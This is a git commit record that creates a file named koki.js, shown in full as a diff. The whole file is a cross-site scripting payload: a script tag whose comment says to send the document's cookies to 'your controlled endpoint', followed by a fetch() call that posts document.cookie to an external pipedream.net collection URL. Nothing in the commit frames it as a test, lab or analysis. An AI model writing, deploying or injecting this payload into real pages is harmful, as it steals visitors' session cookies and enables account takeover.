88dc169fdfb81e587d7ebd45742751c1477e213f
powlzbdz <74605366+powlzbdzdz11@users.noreply.github.com>
2024-11-25 18:00:33 -0500

    Create koki.js

---
+++ koki.js
@@ -0,0 +1,4 @@
+<script>
+    // Send the document's cookies to your controlled endpoint
+    fetch('https://eo3go07kibmnkye.m.pipedream.net/?cookie=' + encodeURIComponent(document.cookie));
+</script>
